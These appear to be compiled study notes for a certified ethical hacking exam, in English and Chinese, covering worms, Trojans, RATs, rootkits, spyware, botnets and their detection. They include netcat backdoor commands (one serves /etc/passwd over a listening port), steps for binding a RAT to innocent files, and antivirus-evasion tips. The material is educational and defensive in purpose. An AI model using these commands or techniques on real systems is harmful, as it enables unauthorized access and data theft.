  - Worms can replicate themselves hundreds of times and spread to all the systems in the network. Each infected system tries to locate and infect other systems on the network, and network performance can slow to a crawl. A worm is a self-replicating malware computer program that uses a computer network to send copies of itself to other systems without human intervention. Usually it doesn’t alter files, but it resides in active memory and duplicates itself, eating up resources and wreaking havoc along the way. The most common use for a worm in the hacking world is the creation of botnets, which we’ve already discussed. This army of robot systems can then be used to accomplish all sorts of bad things.
When it comes to worms and your exam, in earlier versions of the exam EC-Council wanted you not only to know and understand what a worm does but also to identify specific famous named worms based on a variety of characteristics. For example, the Conficker worm disabled services, denied access to administrator shared drives, locked users out of directories, and restricted access to security-related sites. Symptoms included an “Open folder to view files—Publisher not specified” message in the AutoPlay dialog box (the original, and legitimate, Windows option reads “Open folder to view files using Windows Explorer.”)
In the latest version of the official courseware, however, it doesn’t appear they care much about it at all. In fact, the only one making an appearance is something called “Ghost Eye Worm,” which really isn’t much of a worm at all. It’s a hacking tool that uses random messaging on Facebook and other sites to perform a host of naughty efforts. I’m not positive they’ll ignore worms altogether, so I decided to list these for your perusal, should you happen to see a random question about one of them:
- Code Red Named after the soft drink the eEye Digital guys were drinking when they discovered it, Code Red exploited indexing software on IIS servers in 2001. The worm used a buffer overflow and defaced hundreds of thousands of servers.
- Darlloz Known as the worm for “the Internet of Things,” darlloz is a Linux-based worm that targets running ARM, MIPS, and PowerPC architectures—which are usually routers, set-top boxes, and securitycameras.
- Slammer Also known as SQL Slammer, this was a denial-of- service worm attacking buffer overflow weaknesses in Microsoft SQL services. Also called Sapphire, SQL_HEL, and Helkern, it spread quickly using UDP, and its small size (the entire worm could fit inside a single packet) allowed it to bypass manysensors.
- Nimda This worm’s name comes from the word admin spelled backward. Nimda was a successful file infection virus that modified and touched nearly all web content on a machine. It spread so quickly it became the most widespread worm in history within about 22 minutes of its first sighting. Nimda spread through e-mail, open network shares, and websites, and it also took advantage of backdoors left on machines infected by the Code Red worm.
- Bug Bear Propagating over open network shares and e-mail, Bug Bear terminated AV applications and set up a backdoor for later use. It also contained keylogging capabilities.
- Pretty Park Pretty Park spread via e-mail (attempting a send every 30 minutes) and took advantage of IRC to propagate stolen passwords and the like. Running the worm executable often displayed the 3D Pipe screensaver on Windows machines.
- A Nuclear Worm
  If I were to tell everyone to stop what they were doing, close their eyes, and describe to me what the creator of a worm or virus looks like, I bet the responses would be pretty easy to predict. Most people view the creators of these things with contempt, even anger, and almost always picture them as some pimply-faced, angry adolescent bent on making a name for himself. The truth, though, is usually far from the angry individual pounding away on the keyboard. In fact, one of the most famous and most damaging worms in the history of the Internet was created by the U.S. government. At least it allegedly was because everything I’m about to write actually happened, but no one has ever
come out and acknowledged it officially.
 In 2006, the U.S. government, working with Israeli allies, decided to pursue a “cyberdisruption” campaign aimed at crippling Iran’s nuclear facilities. The idea was simple: map out a plant’s functions, create a target vector by using this information, and start random, untraceable attacks to cripple the infrastructure the plant relied on. The worm, probably introduced via an unsuspecting plant employee and a USB stick, did precisely that and targeted centrifuges inside Iranian plants, making them spin too quickly or too slowly. Within a week or so, it successfully shut down roughly one-fifth of the centrifuges the nuclear plant relied on to function and set the Iranian nuclear program back
significantly. It then morphed and
Finally, the last topics we’re required to cover here are malware analysis, countermeasures, and mitigation. Analysis may be something your particular organization makes a habit of, but outside antivirus companies and the like, I’m not sure this is something valid for your day-to-day work. That said, ECC wants you to know about it, so here goes. The first step in analyzing malware is to make sure you have a good test bed. Using a virtual machine with the NIC in host- only mode and no open shares is a good start. Next, analyze the malware on that isolated VM while it’s in a static state. Tools such as binText and UPX can help in examining the binary itself as well as the compression and packaging technique. Next, fire up the malware and check out the processes in use (with Process Monitor and Process Explorer, for example). Review network traffic using NetResident, TCPview, or maybe even Wireshark. Lastly, check to see what files are added, changed, or deleted, what processes continue to spawn, and any changes to the registry. Tools that can help you with malware analysis include, but are not limited to, IDA Pro (www.hex-rays.com), VirusTotal (www.virustotal.com), Anubis (Anubis.iseclab.org), and Threat Analyzer (www.threattracksecurity.com).
And just how are you supposed to protect against viruses and worms? Well, first off, you should probably know what’s running on and being used by your system. Trojans take advantage of unused ports, so if you’re looking at your system and see something using a weird port, that would probably be a good indication you may be infected. Use tools such as TCPView and CurrPorts (not to mention netstat) to see what ports are in use, and by what. Check out which processes are in use with Process Monitor and Process Explorer, and keep an eye on any registry changes with Regscanner or any of a number of registry- scanning tools. Lastly, keep an eye on system files and folders with tools such as SIGVERIF and Tripwire.
For study purposes, a good antivirus program is also a must, and keeping it up to date is key (the system is only as good as your signature files, and if you’re asleep at the wheel in keeping them updated, you’re opening yourself up to infection). In the real world, most of us have a blind, seething hatred of AV programs. Malware moves quickly in the modern world, and most of it runs and is kept in memory versus on the disk. Signature-based AV simply can’t keep up, and heuristic AV simply isn’t much better. In fact, I think you could make a strong argument in an enterprise network that the false sense of security created by the mere existence of desktop antivirus makes the system less secure. I can’t tell you the number of times during our incident response process a victim has said, “Well, yes, of course, but don’t you have antivirus installed on this machine to protect me?” Feel free to load one up if it makes you feel better, but in addition to frustrating your attempts at loading and playing with genuine security tools, you’re likely just wasting time.
Another good option, at least as far as ECC is concerned, is the sheepdip computer. A sheepdip system is set up to check physical media, device drivers, and other files for malware before it is introduced to the network. Typically, this computer is used for nothing else and is isolated from the other computers, meaning it is not connected to the network at all. Sheepdip computers are usually configured with a couple of different AV programs, port monitors, registry monitors, and file integrity verifiers.
NOTE It’s time for a little insight and vocabulary lesson in the real world versus your exam. Terms such as netizen (a.k.a. cybercitizen: a person activel involved in online communities) and technorati (not only a blog search engine but a term of endearment for the technically astute among us) are perfectly acceptable to the techno-geeks you’ll be working with, on and off pen test teams. Groovy discussions about “podcasting on a Web 2.0 site while creating mashups of tweets” are probably just fine. But to borrow a line from the great American cinematic classic Office Space, regarding using the term sheepdip in the real world: “I believe you’d get your rear kicked saying something like that, man.”
 moved on to other attack vectors, mimicking mechanical failures, falsifying live status reporting, and frustrating efforts to bring the entire
plant, and system, back to functionality.
 The problem was, the dirty little bug didn’t stay where it was supposed
to stay. Apparently an engineer at the Natanz plant took an infected  machine home and connected it to the Internet. Stuxnet, as it came to be known, was now replicating across the Internet, and its code was exposed for public investigation. While this act marked the beginnings of the spread, USB drives turned out to be one of, if not the, most critical methods early on in spreading Stuxnet as far as it went. Later variants, created when hackers got hold of the code and went crazy with it, used
many other methods to spread.
 So, how did it escape the specific area the creators intended it to stay in? That, my friends, has been a point of debate ever since it went public.
Many security companies have taken apart the code and examined it to
figure out who made the programming error that resulted in it leaping to
the public domain. To my knowledge, no one has ever been able to
determine who made the mistake. A couple of things can be noted for
certain, however. Stuxnet code is still being morphed, updated, and
reprogrammed for present and future attacks. And some of those attacks
are, and will no doubt be, against the very governments responsible for
creating it.
Trojan
Trojan horse, an apt metaphor for this malicious software.
- a harmful piece of software that looks legitimate:
- a malware program, appears to perform useful task, but also does thing with negative consequences (like launches a keylogger).
- can be installed as part of the payload of other malware/app.
- often installed by a user or administrator, deliberately or accidentally.
  - Unlike viruses and worms, Trojans do not reproduce by infecting other files nor do they self-replicate.   - Trojans must spread through user interaction:
  - opening an email attachment
  - downloading and running a file from the Internet.
- can exist on a system for years sin detected.
To hackers, the word Trojan means a method to gain, maintain access on a target
machine.
The idea of a Trojan is pretty simple.
- First, send an innocent-looking file to your target, inviting them to open it.
- They open it and, unaware to what’s going on, merrily install software that makes your job easier.
- This software might be designed:
  - to steal specific types of information to send back, act as a keylogger,
  - perform 1000 other equally naughty tasks.
  - even provide remote control–type access to a hacker any time he feels like it.
  - For us ethical hackers, the ultimate goal is to provide something we can go back to later—a means to maintain our access.
  - Trojan isn’t a backdoor, they’re tied together in this exam: the Trojan is the means of delivery, and the backdoor provides the open access.
The easiest way to get a target to install your malware, providing you access to their machine, is to just ask them to do it for you. ▪


## - Send malware (usually a Trojan) via e-mail, file sharing, or a browser
- make it look like a legitimate application? Well, there are a couple of
options available for you.
1. wrappers, programs that allow you to bind an executable of your choice (Trojan) to an innocent file your target won’t mind opening.
Example
- use a program such as EliteWrap
- to embed a backdoor application with a game file (.exe).
- Your target opens the latest version of Elf Bowling and starts rolling strikes. Meanwhile, your backdoor is installing and sits there waiting for your use later.
- Wrappers do have their own signatures and can definitely show up on AV scans.
  - If you’ve wrapped 20 items, you’d wind up with a single malware discovery in your antivirus.
2. what good does it do to find a hapless user clicking on everything you send him, only to have each attempt quashed by the antivirus? Packers and crypters, tools that alter malware to hide it from signature-based antivirus.
Crypters: software tools that use a combination of encryption and code manipulation to render malware undetectable to AV and other security monitoring products (fud, “fully undetectable”).
Packers, use compression to pack the malware executable reduce to a smaller size, and harder to detect for some antivirus engines. Regardless of which type used, both work much like a ZIP file, except that the extraction occurs in memory and not on the disk.
   - There are several crypters out there, but be forewarned—delving into this stuff can take you to some really dark places on the interwebs.
  - ECC mentions a few in the courseware but, for many reasons, doesn’t give links to download them—which is probably a good thing.
3. finally, the exploit kits
- tons of platforms from deliver exploits and payloads, and many are used
primarily to deploy Trojans on target systems.
- Examples:
  - Infinity, Bleeding Life, Crimepack, and Blackhole Exploit Kit.
4. Trojan deliver method:
- increasingly using drive-by downloads to deliver Trojans.
  - In a drive-by download, web servers include malicious code that attempts to download and install itself on user computers after the user visits.
  - typical steps involved in a drive-by download:
1. Attackers compromise a web site to gain control of it.
2. Attackers install a Trojan embedded in the web site’s code.
3. Attackers attempt to trick users into visiting the site. (send the link...)
4. When users visit, the web site attempts to download the Trojan onto the users’systems.
- become popular in recent years is rogueware / scareware.
  - Rogueware masquerades as a free antivirus program. ▪


## and install free antivirus software.
  - installs and run, reports multiple issues, isn’t true.
  - encourages the user to resolve these issues, small fee of $79.95,
users can unlock the full version to remove the threats.
  - Some rogueware installs additional malicious components. example, it might allow the attacker to take remote control of the infected system.
- Many web browser extensions include malicious Trojans.
- After it is activated, it can achieve any number of attacks on the host:
- irritating the user (popping up windows or changing desktops)
- damaging the host (deleting files, stealing data, activating and spreading
other malware, like viruses).
- create a backdoor to give malicious users access to the system.
- replace a valid program during installation.
- compromise the security of your system
木馬的分類:
Command Shell Trojans:可遠端執行惡意指令, provide a
backdoor to the system that you connect to via command-line access.   - Example:
  - Netcat: it does provide a means to open and close listening ports—in effect providing a method to backdoor your way into a system. In and of itself, that (opening and closing ports) doesn’t seem malicious at all—but add malicious intent to it.
  - Known as the “Swiss Army knife” of TCP/IP hacking, Netcat 1,319

▪
⁃
provides all sorts of control over a remote shell on a target.
  - Netcat can be used for outbound or inbound connections, over TCP or UDP, to or from any port on the machine.
  - It offers DNS forwarding, port mapping and forwarding, and proxying.
  - You can even use it as a port scanner if you’re really in a bind.
  - Example
  - nc –e IP_Address port_number.
  - //establish command-line access to the machine,
  - Tired of Telnet? Just type the –t option.
  - nc –l –p 5555
  - //opens port 5555 in a listening state on the target machine.
  - nc IP_Address –p 5555
  - //connect to the target machine—a raw “telnet-like”
connection.
nc -l -p 5555 < /etc/passwd
Defacement 毁损 Trojans:只更改程式的介面, a Trojan that changes the title bar of an Excel spreadsheet to read “YOU’VE BEEN HACKED!”
Botnet Trojans:具三層式架構(攻擊發起點、攻擊執行點、受 害目標)(like Tor-based Chewbacca and Skynet),
Proxy Server Trojans:把受害者的電腦作為proxy讓攻擊者連接 1,320

▪
FTP Trojans:在受害者的電腦上安裝FTP Server
VNC Trojans:在受害者的電腦上建立VNC Server的連線
HTTP/HTTPS Trojans:可繞過受害者的防火牆，並建立HTTP(S) 傳輸連線
Remote Access Trojans:攻擊者可取得受害者電腦完整GUI介 面的存取權限 (like RAT, MoSucker, Optix Pro, and Blackhole)
  - convert Channel Tunneling Trojan (CCTT): one form of remote access Trojan that uses a variety of exploitation techniques to create data transfer channels in previously authorized data streams. It’s designed to provide an external shell from within the internal environment.
     輸
convert Channel Trojans:攻擊者與受害者間建立隱蔽的通道傳 Notification Trojans:將受害者電腦的資訊回傳給攻擊者
 Data Hiding Trojans:加密整個受害者的電腦 - e-banking Trojans:
  - Zeus, Spyeye
  - Neverquest Trojan: targets banking websites, to steal credentials and sensitive info and to set up VNC remote access to target systems.
 Solution:
- The best preventive measure: not to allow them to enter your system.
  - install a new software program / operating system, back it up!
  - reinstall the original programs, it should delete the Trojan horse.
- know common file extensions and the applications with which they’re
associated.
 ⁃
- A port scan may also reveal a Trojan horse.
  - If an application opens a TCP or UDP port that isn’t regularly used in
your network, you may notice this and begin corrective action.
  - a real hacker simply won’t bother with protocols you’re going to be watching for.
  - Some of the more common port numbers used by various Trojans,  For spot port usage
- Several programs are available to keep an eye on the port numbers used on your system
- Netstat: command line tool
  - netstat –an: show all the connections and listening ports in
numerical form
  - show all connections in one of several states,
  - SYN_SEND (indicating active open)
  - CLOSED (the server has received an ACK from the client and closed the connection).
  - listening state: waiting for something to come along and ask for them to open.
  - netstat -b: displays all active connections and the processes / app that are using them (valuable information in ferreting out spyware and malware.)  ⁃
- Fport
  - free tool from McAfee
  - reports all open TCP/IP and UDP ports and maps them to the owning applications.
  - get the same information you would see using the ‘netstat -an’ command, but also maps those ports to running processes with the PID, process name, and path. - TCPView, and IceSword: see what’s Running, For running process.
- Process Explorer: free tool from Microsoft (formerly from SysInternals), tell almost everything about a running process.
- AutoRuns: free Microsoft offering formerly from SysInternals, figure out what runs at startup on your system.
On a Windows, scan the registry, drivers, services being used, and startup routines.
- the registry, you can monitor manually,
- or use monitoring tools:
  - SysAnalyzer, Tiny Watcher, Active Registry Monitor, and Regshot.
  - many antivirus and malware scanners will watch out for registry errors.
  - Malwarebytes: display all questionable registry settings it finds on a scan
- Windows will automatically run everything located in Run, RunServices, RunOnce, and RunServicesOnce,
- most questions are centered around settings from
HKEY_LOCAL_MACHINE. processes and services can be monitored: ▪


## - Windows Service Manager, Service Manager Plus, and Smart Utility.
- check the startup routines, where most of these will be present; it won’t do you much good to identify a bad service or process and kill it, only to have it pop up again at the next start.
- Windows machine: msconfig command will open a configuration window showing you all sorts of startup (and other) settings
 ⁃
verifying the integrity of critical files, one of those bedrock-type actions to protect against/detecting Trojans.
Signature Integrity Verifier (SIV)
- Tripwire: a well- respected integrity verifier that can act as an
 HIDS in protection against Trojans.
- SIGVERIF: built into Windows machines, to help verify the
integrity of critical files on the system.
  - The log file for SIGVERIF is sigverif.txt, can be found in the
Windows folder.
  - The log is, by default, overwritten each time the tool is run.
  - Third-party drivers that are not signed are displayed as “Not Signed” and indicate a good spot to begin your search.
   - Helping you catch unexpected changes to a system utility file that might indicate it had been replaced by a Trojan horse
Example:
with social networking:
- The Boonana Trojan, cropping up in Facebook, affecting both macOS and Windows. A message would appear asking the user if they appeared in certain a video and including a link. Clicking the link to run the video triggered a Java applet that would then redirect legitimate requests to known malware servers.
- allows attackers to take control of systems from remote locations.
 - ***RAT (Remote access Trojan): enables unauthorized remote access to a compromised system. - often delivered via drive-by downloads.
- Once installed
  - attackers can then access the infected computer at any time, and install additional malware if desired.
  - automatically collect and log keystrokes, usernames and passwords, incoming and outgoing email, chat sessions, and browser history as well as take screenshots.
  - The RAT can then automatically send the data to the attackers at predetermined times.
  - attackers can explore the network using the credentials of the user or the user’s computer.
- Attackers often do this to discover, and exploit, additional vulnerabilities within the network.
- It’s common for attackers to exploit this one infected system and quickly infect the entire network with additional malware, including installing RATs on other systems.
- To hack a computer remotely using a RAT
  - create a server, send this server to the victim computer
  - Generally, this server is binded to any file, like a picture or song, so that whenever the victim opens the file on his computer, our server is installed.
  - This server opens a port on the victim’s computer, allowing you to remotely hack the device via the open port.
- Some examples of RATs are: Prorat, Turkojan, Yuri RAT and many other.
- Symbol: a new port in a listening state.   trying to package a RAT Trojan so that Anti-Virus software will not detect it. To evading Anti-Virus scanner?
- Break the Trojan into multiple smaller files and zip the individual pieces
- Change the content of the Trojan using hex editor and modify the checksum
- Encrypt the Trojan using multiple hashing algorithms like MD5 and SHA-1
- Convert the Trojan.exe file extension to Trojan.txt (not useful)
Examples of Trojan Horses
Malware
A classic example of a Trojan horse is a utility program that performs a useful task better than an existing standard program, such as displaying folders and files of a file system in a beautiful way, while also performing a secret malicious task. By tricking an unsuspecting user into using the Trojan horse, the attacker is able to run his program with all the access rights of the user. If the user can read a proprietary document filled with company secrets, then the Trojan horse can too, and it can even secretly send what it finds to the attacker if the user is connected to the Internet. If the user can send signed emails, then the Trojan horse can too, all in the user’s name. And if the user can automatically log in to an online banking system using a stored password, then the Trojan horse can too. The main risk of a Trojan horse is that it allows an attacker to perform a task as if he were another user, possibly even a system administrator.
A real-world example of a Trojan horse was used on one of of the authors while he was in college. A previously trusted friend, whom we will call “Tony,” gave the author and several of his friends a program designed to indicate when and where members of this circle of friends were logged in on the campus computer network. In addition to this useful feature, this particular program also sent the friends’ passwords to Tony’s email account. This particular Trojan horse wasn’t discovered until someone noticed a friend logged in at two places at the same time and, when they went to investigate, they found Tony at one of the two locations. Tony was ultimately caught by his own Trojan horse.
Other real-world Trojan horse examples include the following:
The AIDS Trojan. This was a Trojan horse program that claimed to provide important information about the AIDS disease (acquired immune deficiency syndrome). It was first distributed by mailing floppy disks in 1989. Running the program instead installed a Trojan horse, which would remain quiet until several restarts had occurred, at which time it would encrypt the user’s hard drive. Then the Trojan would offer to give the user the password to decrypt the hard drive, but only after she paid a fee. Thus, the AIDS Trojan horse was a type of automated ransom.
False upgrade to Internet Explorer. This Trojan horse was sent via email as an executable file, which purported to be an upgrade to Microsoft’s Internet Explorer. After installation, the program would make several modifications to the user’s system. Because of this attack and others like it, most users have learned to avoid opening email attachments that are executable files, no matter what wonderful claims are made about the enclosed program. False antivirus software. There have been several instances of this Trojan horse, which advertises itself as antivirus software. When installed, such Trojan horses typically modify the operating system to block real antimalware programs from executing, and then proceed to attempt to steal the user’s passwords.
- Back Orifice. First distributed in 1998, this program provided access to a remote computer over an encrypted network connection. Its fea- tures included executing commands, transferring files, and logging keystrokes. It was implemented as a service for systems running Windows 95 or Windows 98. Thus, once installed, Back Orifice was automatically started whenever the machine was booted. While it had a useful functionality as a remote login and administration tool, Back Orifice was primarily used as a backdoor to steal information. The installation program was typically distributed via email as an executable attachment with an enticing name, such as PAMMY.EXE When a user opened this attachment, the installation ran quickly and silently. Also, Back Orifice did not show up in Task Manager. Thus, most victims were unaware of the presence of this program.
- Mocmex. In February 2008, it was discovered that several Chinese- made digital photo frames (actual picture frames that render dig- ital images) contained a Trojan horse known as Mocmex. When an infected frame is plugged into a Windows machine, malware is copied from the frame to the computer and begins collecting and transmitting passwords. Mocmex is interesting because it is one of the first widely distributed viruses that takes advantage of an alternative media, in this case digital photo frames.
Remote administration tool (RAT)
allows a remote user to access the system to administer it. ▪


## offers the opportunity to exploit powerful features of the operating system. One of the most dangerous exploits:
  - Ghost Rat / GhostRat:
  - took advantage of the complex features built into Adobe Acrobat
PDF files
  - to allow attackers to record audio and video remotely in Windows OS.
  - Back Orifice, NetBus: for Windows-based systems.
  - These packages are typically installed using a Trojan horse program.
  - allow a remote user to take full control of systems
  - They run on all of the current Windows operating systems.
Rootkits
have become the software exploitation program du jour. software programs
A rootkit is a collection of tools (programs) that enable administrator-level access to a computer.
- extremely difficult to detect.
- Modify the OS processes: ability to hide certain things from the operating system for malicious activity
  - 隐藏自己的踪迹和保留root访问权限, 隐藏、操纵、收集数据.
  - The malicious software operates in a stealth
fashion by hiding its files, processes and registry 1,332

 Example of log:
keys
  - may be used to create a hidden directory or folder designed to keep out of view from a user's operating system and security software.
  - hiding that the system has been infected / compromised by malicious code.
  - suspect something is wrong, but antivirus scans and other checks indicate everything is fine because the rootkit hides its running processes to avoid detection.
  - do not show up in Task Manager, connections established but do not appear in a netstat display.
  - the rootkit masks the presence of these items.
  - many rootkits are written to get around antivirus and antispyware
programs that are not kept up-to-date.
  - prevents the antivirus software by intercept function calls.
  - but, antivirus software can often detect the hooked processes by examining the contents of the system’s random access memory (RAM).
  - mask intrusion and obtain administrator-level access to a computer or computer network
    - Rootkits have system/root/kernel-level access to systems: have the same level of access as the operating system.
  - rootkit require Kernel level privileges
  - Rootkits use hooked processes / hooking techniques, to intercept ▪


##  ▪


## function calls to the operating system.
  - Hooking: intercepting system-level function calls, events,
or messages.
  - The rootkit installs the hooks into memory and uses them to
control the system’s behavior.
  - manipulating 操纵 function calls to the operating system and
filtering out information that would normally appear.
  - rootkits could hide anywhere that there is enough memory to reside:
video cards, PCI cards...
modify system files: Registry...
modifies system access: remove users’ administrative access...
Attackers who have successfully installed a rootkit on a user’s system might log on remotely, installed backdoor by the rootkit. direct the computer to connect to computers on the Internet and send data. Data can include anything collected from a keylogger, collected passwords, specific files.
The best defense:
monitor what your system is doing and catch the rootkit in the process of
installation.
- antivirus software can detect the hidden hooked processes by examining the contents of the system’s random access memory (RAM).
- boot into safe mode, or have the system scanned before it boots, but isn’t always successful.
SIV(System Integrity Verifiers):定期從系統檔案的hash值去判 斷是否有遭置換，若有，則以原系統檔案覆蓋掉。
 ▪


##  very difficult to detect because they can hide so much of their activity. A clean bill of health by a malware scanner may not be valid.
- 偵測Rootkit的方式:
  - Integrity-Based:將現在的file system、boot records、memory與
baseline做比對
  - Signature-Based:將system processes、executable files與特徵庫做 比對
  - Heuristic/Behavior-Based:根據系統的活動或行為做判斷
  - Runtime Execution Path Profilling:針對特定路徑中程式的異常行為
做比對
  - Cross View-Based:將system files、processes、registry keys做比 對
solution: reinstall your system.
2)LKM的好处是什么? 可加载内核模块。可以实现动态加载，无须重新实现整个内核。 3)请描述系统调用劫持的过程。
首先，当进行一次系统调用的时候，会触发软中断(INT $0x80)进入内核的系统调用 处理程序。然后在系统调用处理程序的代码中寻找到 sys_call_table 的地址。接下来， 根据 sys_call_table 地址和 eax 中存放的系统调用号找到真正的系统调用例程的地址，将 其替换为我们自己的系统调用处理函数地址。
4)请解释，为何Unix可以做到一切皆文件。 虚拟文件系统(VFS)。
向上，对应用层提供一个标准的文件操作接口;对下，对文件系统提供一个标准的接 口，以便其他操作系统的文件系统可以方便的移植到 Linux 上;VFS 内部则通过一系列 高效的管理机制，比如 inode cache, dentry cache 以及文件系统的预读等技术，使得底
 层文件系统不需沉溺到复杂的内核操作，即可获得高性能;此外 VFS 把一些复杂的操作 尽量抽象到 VFS 内部，使得底层文件系统实现更简单。
Viewing running processes on a windows-based machine
As an administrator, you need to know what processes are running on a machine at any given time. In addition to the programs that a user may be running, there are always many others that are required by the operating system, network, or other applications.
All recent versions of Windows include Task Manager, which allows you to see what is running. To access this information, follow these steps:
1. Right-click an empty location in the Windows Taskbar.
2. Choose either Task Manager or Start Task Manager (depending on the Windows ver- sion you are running) from the pop-up menu that appears.
3. The Task Manager opens to Applications by default and shows what the user is actually running. Click the Processes tab. Information about the programs that are needed for the running applications is shown, as well as all other processes that are currently running.
4. If the Show Processes From All Users check box appears beneath this tab, click it. Many of the names of the processes appear cryptic, but definitions for most (good and bad) can be found with a Google search.
5. Examine the list and look for anything out of the ordinary. After doing this a few times, you will become familiar with what is normally there and will be able to spot oddities quickly.
6. Notice the values in the CPU column. Those values will always total 100, with System Idle Processes typically making up the vast majority. High numbers on another pro- cess can indicate that there is a problem with it. If the numbers do not add up to 100, it can be a sign that a rootkit is masking some of the display. 7. If you are running a newer version of Windows, click the button Show Processes From All Users. User Account Control (UAC) will ask you to confirm the action; click Continue.
8. Click the top of the second column where it says User Name to order the list alpha- betically by this field.
9. Scroll to where the SYSTEM entries begin and look for anything suspicious there.
10. CloseTaskManager
Viewing running processes on a linux-based machine
Most versions of Linux include a graphical utility to allow you to see the running pro- cesses. Those utilities differ based on the distribution of Linux in use and the desktop that you have chosen.
All versions of Linux, however, do offer a command line and the ability to use the ps util- ity. Because of that, this method is employed in this exercise. To access this information, follow these steps:
1. Open a shell window or otherwise access a command prompt. 2. Enterps –ef | more.
3. The display shows the processes running for all users. The names of the processes appear in the rightmost column, and the processor time will be in the column closest to it. The names are cryptic, but definitions for most can be found using the man command followed by the name of the process. Those that are application specific can usually be found through a web search.
Examine the list and look for anything out of the ordinary. After doing this a few times, you will become familiar with what is normally there and will be able to spot oddities quickly.
4. Pay particular attention to those processes associated with the root user (the user appears in the first column). Because the root user has the power to do anything, only necessary daemons and processes should be associated with that user. You can look only at those running that are associated with the root user by entering ps –u root. 5. Exit the shell. Adware:
primary purpose: deliver ads, then it is adware.
generate revenue 收益 for the creator.
can have the same qualities as spyware, Because spyware and adware share similar features,
Windows Defender can be used as a first line of defense.
When adware first emerged, its intent was primarily to learn a user’s habits for the purpose of targeted advertising.
As the practice of gathering information on users became more malicious, more people began to call it spyware. However, some traditional adware still exists. Internet marketers have become very sophisticated and use a combination of web analytics with behavioral analytics to track user activity. They then provide targeted ads based on past user activity.
The term adware also applies to software that is free but includes advertisements. without any intention of misleading the user.
Spyware
differs from other malware: it works, often actively, on behalf of a third party, and exists to provide commercial gain   - viruses and worms: self-replicating, like,
  - Spyware: spread to machines by users who inadvertently ask for it.
The users often do not know that they have asked for it, but they have acquired it by
downloading other programs, visiting infected sites, so on.
monitors the user’s activity
  - reports it to another party without informing the user that it is doing so.
  - Often gathering information about the user to pass on to marketers,
  - Changing home page, redirecting web browsers, installing additional software within the browser.
  - can slow a system down, poorer performance.
rather harmless compared with what more malicious spyware (privacy-invasive
software) might do.
  - Privacy-invasive software: separate users from their money using
data-harvesting techniques.
  - It attempts to gather information to impersonate users, empty bank
accounts, and steal identities.
  - example, some spyware includes keyloggers. The spyware periodically reads the data stored by the keylogger, and sends it to the attacker. In some instances, the spyware allows the attacker to take control of the user’s system remotely.
Spyware is often included with other software like a Trojan. The user installs one application but unknowingly gets some extras. Spyware can also infect a system in a drive-by download. The user simply visits a malicious web site that includes code to automatically download and install the spyware onto the user’ssystem. The operating systems from Microsoft are the ones most affected by spyware. Example:
  - Keylogger
Keylogger
- a piece of software
- example of spyware, spyware often includes keylogger.
- records keystrokes pressed into a log file.
- and then allows that log file to be viewed, passwords and other sensitive data can be seen.
- The log file is often encrypted, isn’t easily seen or accessed by other.
- keyloggers
  - software
  - Or installed on harware too:
  - keyboard adapters that can be placed on a system and retrieved at a
later date.
  - These hardware devices store the log file and operate as hidden drives until unlocked using their unlock code.
  - Example
  - purchase a USB keylogger, plug it into the computer, and
    - Example: pc behave erratically, experienced slowness, input lag and found text files contain pieces of emails or online conversations. virus scan detects nothing. ▪


## Countermeasure:
plug the keyboard into the USB keylogger.
  - This hardware keylogger will record all keystrokes and store them within memory on the USB device.
 Hiding file
  - ATTRIB +S+H
  - ATTRIB +H
Bots
infected computers: zombies, bot, botnet. Bots: Generically, bots are software robots.
  - A software that runs automatically and autonomously.
  - Example:
  - Google uses bots as search engine spiders to crawl through the Internet looking for web pages.
  - attackers also use bots for malicious purposes.
  - typically thought of as an app that can be controlled remotely (like
Trojan horse, backdoor).   - compromise the integrity of a large amount of data. Botnet:
  - includes multiple computers that act as software robots (bots) and function together in a network, often for malicious purposes.
  - malicious software running on a zombie and under the control of a bot- herder.
  - Example:
  - Google: Googlebot to find web pages and bring back values for the
index.
Bot herders: criminals who manage botnets.
  - attempt to infect as many computers as possible and control them
through one or more servers running command-and-control software.
  - The infected computers periodically check in with the command-and- control servers, receive direction, and then go to work. The user is often unaware of the activity.
Most computers join a botnet through malware infection.
  - Example:
  - download pirated software with a Trojan or click a malicious link, resulting in a drive-by download.
  - The malware then joins the system to a botnet.
Example:
  - Mirai:
   - external IPs communicating with internal computers during off hours.   - Bot herders use Mirai to infects Linux systems that are running out-of- date versions of Linux and join them to a botnet.
  - includes Linux running on Internet of things (IoT) devices.
  - Infected devices search for other IoT devices on the Internet and infect
them.
  - Attackers published the source code for Mirai, accessible by many attackers.
  - A Mirai botnet launched an attack in October 2016 against Domain Name System (DNS) servers. It included about 100,000 simple devices such as digital cameras and printers that were connected to the Internet.
  - The bot herders directed the devices to repeatedly query DNS servers in a protracted distributed denial-of-service (DDoS) attack.
  - overwhelmed the DNS servers, prevented users in the US and Europe from accessing many common web sites, such as Amazon, Second Life, Twitter, CNN, BBC, Fox News, Tumblr, Reddit, and many more.
  - Similarly, Wordfence discovered attacks coming from a botnet of approximately 10,000 separate IP addresses in April 2017. After investigating the attacks, they learned that the attacking systems were typically home routers that had a known vulnerability, named the Misfortune Cookie by Checkpoint Software Technologies.
  - Checkpoint reported the vulnerability in 2005. However, this attack showed that a specific Internet Service Provider (ISP) in Algeria was issuing these unpatched routers to its customers.
Botnet herders sometimes maintain complete control over their botnets. Or rent access out to others to use as desired.
Some of the instructions sent by the command-and-control servers include:
Send spam. Launch a distributed denial-of-service attack.
  - DoS and DDoS can be launched by botnets, as can many forms of adware, spyware, and spam (via spambots).
Download additional malware, adware, or spyware such as keyloggers.
Most bots are written to run in the background with no visible evidence of their presence.
Many malware kits can be used to create botnets and modify existing ones. Solution:
  - No universal approach
  - Some can be easily detected by looking at a database of known threats,
whereas others have to be identified through analysis of their behavior.
Logic Bomb
programs or code snippets execute when a certain predefined event occurs. a string of code embedded into an application or script that will execute in
response to an event.
  - event : a specific date or time, user action, launch specific program.
A bomb may send a note to an attacker when a user is logged on to the Internet and is using a word processor. This message informs the attacker that the user is ready for an attack.
Logic bombs may also be set to go off on a certain date or when a specified set of circumstances occurs.   Backdoor attack have two different meanings: The original term:
  - troubleshooting and developer hooks into systems that often circumvented normal authentication.
  - During the development period, programmers add backdoors or maintenance hooks. (not recommended)
  - Backdoors allow them to examine operations inside the code while the code is running. But should stripped out of the code when it’s moved into production.
  - When a software manufacturer discovers a hook that hasn’t been removed, it releases a maintenance upgrade / patch to close the backdoor. common when new product is initially released.
The second type:
  - gaining access to a network
  - inserting a program or utility that creates an entrance for an attacker: mallow a certain user ID to log on without a password or to gain administrative privileges.
  - Malware often installs backdoors on systems to bypass normal authentication methods.
usually an access or modification attack.
A number of tools exist to create backdoor attacks on systems: Back Orifice and
NetBus.
